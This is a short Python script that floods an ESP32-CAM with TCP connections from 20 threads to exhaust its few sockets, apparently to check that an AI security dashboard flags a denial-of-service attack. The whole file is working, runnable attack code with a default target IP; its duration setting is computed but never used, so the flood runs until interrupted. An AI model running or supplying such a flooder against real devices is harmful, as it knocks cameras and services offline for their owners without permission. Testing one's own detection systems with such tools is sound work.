import socket
import threading
import time

def tcp_flood(target_ip, target_port=80, duration=10):
    print(f"🔥 [DoS] Initiating TCP Socket Flood against ESP32-CAM ({target_ip}:{target_port})")
    print("⚠️  ESP32 only supports ~4 concurrent TCP sockets. This will exhaust them instantly!")
    
    end_time = time.time() + duration
    sockets = []
    
    def attack_thread():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((target_ip, target_port))
                sockets.append(s)
            except:
                pass
                
    # Launch 20 concurrent threads to hoard all available ESP32 TCP connections
    threads = []
    for _ in range(20):
        t = threading.Thread(target=attack_thread)
        t.daemon = True
        t.start()
        threads.append(t)
        
    try:
        while True:
            time.sleep(1)
            print(f"Hoarding {len(sockets)} TCP connections...")
    except KeyboardInterrupt:
        pass
        
    for s in sockets:
        try:
            s.close()
        except:
            pass
            
    print("✅ Attack Complete. Target TCP sockets should be recovering now.")
    print("👀 Check your AI Dashboard - it should flag a DoS Attack!")

if __name__ == "__main__":
    ip = input("Enter Target ESP32-CAM IP (Default: 192.168.24.167): ")
    if not ip.strip():
        ip = "192.168.24.167"
        
    dur = input("Enter Duration in seconds (Default: 10): ")
    dur = int(dur) if dur.strip().isdigit() else 10
    
    tcp_flood(ip, 80, dur)
